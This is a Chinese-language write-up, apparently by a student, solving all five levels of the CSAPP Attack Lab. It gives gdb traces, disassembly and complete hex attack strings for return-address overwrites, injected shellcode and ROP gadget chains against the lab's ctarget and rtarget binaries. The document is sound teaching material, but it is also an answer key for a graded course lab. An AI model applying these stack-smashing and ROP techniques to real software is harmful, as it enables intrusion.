## CSAPP  缓冲区溢出实验

### 实验介绍

本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。

### 预备知识

* 缓冲区溢出的原理，参考《CSAPP原书第3版》`3.10`小节 

* `gdb`和`objdump`使用
* x86_64下的汇编

### 实验准备

从`CSAPP`网站获取实验所需文件`target1.tar`:  [http://csapp.cs.cmu.edu/3e/labs.html](http://csapp.cs.cmu.edu/3e/labs.html)

`linux`下执行`tar xvf target1.tar`，得到如下文件。每个文件作用简述如下：

* `ctarget`：代码注入攻击的程序。
* `rtarget`：ROP攻击的程序。
* `cookie.txt`: 记录`cookie`的值，攻击时需要用到。

* `farm.c`: 用于ROP攻击寻找gadget的文件。

* `hex2raw`：将ASCII码转化为字符串的小程序，用于构造攻击字符串。

实验共有5关，每一关的目标如下：

![任务图](C:\Users\pc\Desktop\图片\任务图.PNG)**实验前，务必仔细阅读`attackLab`实验手册，可参考[attacklab.pdf](http://csapp.cs.cmu.edu/3e/attacklab.pdf)**

### 第一关

这一关不需注入新的代码，只需要让目标程序`ctarget`重定向到一个已存在的过程即可。

`ctarget`中定义了`test`函数, `test`函数会调用`getbuf`函数，C代码如下：

```C
void test() {
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`ctarget`中还定义了`touch1`函数，C代码如下：

```C
void touch1() {
	vlevel = 1;
	printf("Touch1!: you called touch1()\n");
	validate(1);
}
```

本关的目标是：在`getbuf`函数返回时，令程序跳转到`touch1()`而不是从`test()`正常返回。

我们需要攻击`getbuf`函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。

首先查看`getbuf`函数的汇编代码：

```assembly
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp
  4017ac:   48 89 e7                mov    %rsp,%rdi
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets>
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp		
  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转
```

从`sub  0x28 %rsp`看出， `getbuf`函数在栈上分配了`40`个字节。再看下`test`函数的汇编代码：

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
   0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf> #将下一条指令0x401976压栈，并跳转到getbuf
   0x0000000000401976 <+14>:    mov    %eax,%edx
```

这里`callq`指令将`0x401976`压栈，并跳转到`getbuf`; `getbuf`执行结束后，使用`retq`指令从栈中弹出`0x401976`，并作为返回地址跳转。

假设输入字符串是`"1234567876543210"`， 程序执行到`0x4017b4`，此时栈组织如下：

![AttackLab 图1 栈组织结构](C:\Users\pc\Desktop\图片\AttackLab 图1 栈组织结构.PNG)

因此，我们需要先把栈上`40`字节填满，然后将`touch1`的地址写到`$rsp + 0x28`处，覆盖原先正常的返回地址`0x401976`。下面找到`touch1`的地址为`0x4017c0`

```assembly
(gdb) disassemble touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   ...
```

构造攻击字符串, 写到文件`hex1`

```txt
00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序
```

利用`hex2raw`工具将字节码转为字符串，写到文件`answer1`， 用法如下：

```shell
./hex2raw < hex1 > answer1
```

执行`ctarget`程序验证结果，其中`-i`指定字符串所在文件，`-q`必选参数

```shell
# ./ctarget -q -i answer1
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### 第二关

与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看`touch2`代码：

```C
void touch2(unsigned val) {
	vlevel = 2;
	if(val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
}
```

可以看出，我们需要在跳转到`touch2`的时候将`cookie`的值作为参数传递。思路如下：

* 将返回地址改写为栈中的注入代码的地址。栈的地址可以用`gdb`跑一把程序确认

* 在注入代码中，将`cookie`值传递到`%rdi`。因为`x86-64`汇编使用`%rdi`作为第一个参数
* 确定`touch2`的起始地址并跳转。可利用`push`和`ret`指令实现跳转

首先确定栈的地址，在`0x4017af callq 401a40 <Gets>`处打断点，查看`%rsp`值

```
# gdb ctarget
(gdb) set args -q -i answer1
(gdb) b *0x4017af
Breakpoint 1 at 0x4017af: file buf.c, line 14.
(gdb) r
Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1
Cookie: 0x59b997fa
Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14
14      buf.c: No such file or directory.
(gdb) p $rsp
$1 = (void *) 0x5561dc78
```

得到栈的地址为`0x5561dc78`, 这正是我们注入代码所在的位置。

接下来需要将`cookie`值传给`%rdi`，再跳转到`touch2`。`touch2`地址可通过查看汇编代码得到，结果是`0x4017ec`；跳转到touch2的思路是：**先利用`push`指令将`touch2`地址压栈，接着用`retq`从栈中弹出`touch2`地址并跳转。**

编写如下注入代码，保存到文件`inject2.s`

```assembly
movl  $0x59b997fa, %edi			# cookie值为0x59b997fa
pushq $0x4017ec					# touch2的起始地址为0x4017ec
retq
```

执行`gcc -c inject2.s`, `objdump -d inject2.o`， 将汇编文件转为二进制， 得到如下机器码：

```assembly
0000000000000000 <.text>:
   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   68 ec 17 40 00          pushq  $0x4017ec
   a:   c3                      retq
```

综上，得到我们需要输入的字符串

```txt
bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78
40 00 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78
```

此时的栈组织如下：

![AttackLab 图2 栈组织结构](C:\Users\pc\Desktop\图片\AttackLab 图2 栈组织结构.PNG)

### 第三关

`touch3`代码如下

```C
int hexmatch(unsigned val, char *sval) {
	char cbuf[110];
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}
void touch3(char *sval) {
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

和第二关类似，我们需要传入`cookie`字符串并跳转到`touch3`。但需要注意`hexmatch`函数被调用后，会覆盖一部分`getbuf`的缓冲区。为了避免这一点，可以将`cookie`字符串放到`test`的栈帧里。这一关的思路如下：

* 将返回地址改写为注入代码所在的地址。栈的地址可以用`gdb`跑一把程序确认

* 将`cookie`字符串放到`test`的栈帧里。在注入代码中，将`cookie`串的首地址传递到`%rdi`。
* 确定`touch3`的起始地址并跳转。可利用`push`和`ret`指令实现跳转

与第二关类似，编写如下注入代码，保存到文件`inject3.s`

```assembly
mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处
pushq $0x4018fa				# 将touch3起始地址压栈
retq						# 将touch3地址退栈，并跳转执行touch3
```

执行`gcc -c inject3.s`, `objdump -d inject3.o`， 将汇编文件转为二进制， 得到如下机器码：

```assembly
0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```

我第一次写这块汇编代码时，犯了两个错误：

* 将`$0x5561dca8`错写成`$0x5561dca4`, 导致段错误。**注意64位机器上执行压栈和退栈操作，栈指针`%rsp`应该减去或加上`8`，而不是`4`**

* `pushq  $0x4018fa`中漏写了`$`符号，导致压栈的数据不对。**注意对立即数操作时必须加上$符号**

用`man ascii`查表 ，将字符串`59b997fa`转成ASCII码：`35 39 62 39 39 37 66 61`

综上，得到我们需要输入字符串

```txt
48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78
35 39 62 39 39 37 66 61				# cookie字符串
00 00 00 00 00 00 00 00
```

此时的栈组织如下：

![AttackLab 图3 栈组织结构](C:\Users\pc\Desktop\图片\AttackLab 图3 栈组织结构.PNG)

### 第四关

在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的`rtarget`程序中，采用了如下策略防止代码注入攻击：

* **栈随机化**，每次运行相同的程序，它们的栈地址是不同的。
* **限制可执行代码区域**，栈是不可执行的。

既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫`ROP`的攻击方式

#### ROP

即`return-oriented-programming`。策略是寻找已有的一些以`ret`命令结尾的指令(每条这样的指令称为`gadget`)，通过在这些`gadget`之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(`c3`是`retq`的字节码)

![gadget图](C:\Users\pc\Desktop\图片\gadget图.PNG)

在`rtarget`程序中，有很多这样的`gadget`可以利用，举例如下：

```assembly
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

注意到`48 89 c7`恰好是`movq %rax, %rdi`的编码， `c3`表示`ret`指令。因此这段代码包含了一个`gadget`，且起始地址为`0x4019a2`。也就是说，如果我们改写栈的返回地址到`0x4019a2`，就可以执行`movq %rax, %rdi`和`ret`两条已有指令，绕过了栈上不可执行代码的限制。思路如下：

* 将`cookie`值传递给`%rdi`，难点在于如何用已有的`gadget`拼凑出我们需要的指令，可参考如下的指令表。
* 将`touch2`的起始地址放到栈中。查看汇编代码得到`touch2`地址为`0x4017ec`。

![指令表A](C:\Users\pc\Desktop\图片\指令表A.PNG)

![指令表B](C:\Users\pc\Desktop\图片\指令表B.PNG)

![指令表C](C:\Users\pc\Desktop\图片\指令表C.PNG)

![指令表D](C:\Users\pc\Desktop\图片\指令表D.PNG)

另外，`ret`的字节编码是`0xc3`；`nop`的字节编码是`0x90`，啥也不做，只是将`%rip`加`1`。

可以在`start_farm`和`end_farm`之间找到所有可利用的`gadget`。

```assembly
0000000000401994 <start_farm>:
  401994:   b8 01 00 00 00          mov    $0x1,%eax
  401999:   c3                      retq
000000000040199a <getval_142>:
  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax
  40199f:   c3                      retq
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
00000000004019a7 <addval_219>:
  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:   c3                      retq
00000000004019ae <setval_237>:
  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
  4019b4:   c3                      retq
# ......
```

将`cookie`传给`%rdi`，可以先将`cookie`的值写到栈，再利用`popq %rdi`指令实现。

查表可知`pop`的编码在`58 ~ 5f`。全局搜索后没找到`5f c3`或`5f 90 c3`，说明不能用`$popq %rdi`一步到位；但是可以在`addval_219`中找到`58 90 c3`，先将栈中的值弹出传到`%rax`。记录起始地址为`0x4019ab`。

接着想办法把`%rax`的值传递到`%rdi`。查表，在gadget中找到`48 89 c7`，也就是`movq %rax, %rdi`指令，可以在`<addval_273>`中找到，而且后面正好跟了`c3`，记录起始地址为`0x4019a2`。

到此，我们完成了`gadget`的拼凑，输入的字符串如下：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax
fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa
a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi
ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec
```

此时的栈组织如下：

![AttackLab 图4](C:\Users\pc\Desktop\图片\AttackLab 图4.PNG)

### 第五关

和第三关类似，这关需要将`cookie`字符串的首地址传给`%rdi`, 再调用`touch3`。

由于栈位置是随机的，需要用**栈顶地址+偏移**来确定`cookie`串的位置。 栈顶地址即`$rsp`，可通过`mov %rsp XXX`获取，偏移需要根据`gadget`指令的长度来确定。

如何将`cookie`串地址传到`%rdi`呢？可以在`farm.o`中可以找到如下的`gadget`

```assembly
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3
```

再结合所有`gadget`，多次尝试后发现一个可行解，如下：

* 将`%rsp`传给`%rdi`，利用`mov`实现。

* 将偏移传给`%rsi`， 需利用`pop`和多个`mov`实现。偏移量需要在找到所有`gadget`后通过计算得出。

* 用`lea (%rdi,%rsi,1),%rax`，将`cookie`串的首地址传给`%rax`

* 将`%rax`传给`%rdi`，利用`mov`指令 

#### 具体步骤

##### 1. 将`%rsp`传给`%rdi`

通过`movq %rsp,%rax`,`movq %rax,%rdi`实现：

```assembly
0000000000401aab <setval_350>:
  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:   c3                      retq
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

`movq %rsp,%rax`编码为`48 89 e0`, 地址为`0x401aad`。

`movq %rax %rdi`编码为`48 89 c7`，地址为`0x4019a2`。

##### 2. 将偏移传给`$rsi`

先将偏移写到栈里，再通过如下`4`条指令传到`$rsi`：

```
pop %rax
mov %eax, %edx
mov %edx, %ecx
mov %ecx, %rsi
```

在以下的`gadget`中找到这`4`条指令：

```assembly
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq
00000000004019db <getval_481>:
  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
  4019e0:   c3                      retq
0000000000401a33 <getval_159>:
  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
  401a38:   c3                      retq
0000000000401a11 <addval_436>:
  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
  401a17:   c3                      retq
```

`pop %rax`编码为`58`, 地址为`0x4019cc`。

`mov %eax %edx`编码为`89 c2`，地址为`0x4019dd`。

`mov %edx %ecx`编码为`89 d1`，地址为`0x401a34`。

`mov %ecx,%esi`编码为`89 ce`，地址为`0x401a13`。

##### 3. 将`cookie`字符串传给`%rdi`

利用`lea ($rdi,%rsi,1),%rax`，地址为`0x4019d6`。

##### 4. 将`%rax`传给`$rdi`

```assembly
00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq
```

`mov %rax,%rdi`编码为`48 89 c7`，地址为`0x4019c5`。

到此，我们完成了`gadget`的构造，只需继续在栈中依次填入`touch3`返回地址，`cookie`字符串，`0`(字符串结束标志)，再确定偏移即可。

偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了`9`条指令，因此偏移量为`72`, 即`0x48`

输入的字符串如下：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ad 1a 40 00 00 00 00 00			# 改写返回地址为0x401aad			
a2 19 40 00 00 00 00 00			# 计算偏移的起始地址，返回地址+0x8
cc 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00			# 确定偏移为0x48 
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00			# touch3首地址为0x4018fa
35 39 62 39 39 37 66 61			# cookie字符串地址，用这个地址减去计算偏移的起始地址得到偏移量为72, 即0x48
00 00 00 00 00 00 00 00			
```

此时的栈组织如下：

![AttackLab 图5 栈组织结构](C:\Users\pc\Desktop\图片\AttackLab 图5 栈组织结构.PNG)

### 总结

通过这次实验，初步了解栈和缓冲区溢出的原理，以及安全编码的重要性。

### 参考资料

《深入理解计算机系统 原书第3版》

[CSAPP:Attack lab](https://www.jianshu.com/p/db731ca57342)

[读厚CSAPP III Attack Lab](https://wdxtub.com/csapp/thick-csapp-lab-3/2016/04/16/)

[良性代码，恶意利用：浅谈 Return-Oriented 攻击](https://blog.csdn.net/sdulibh/article/details/17913815?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param)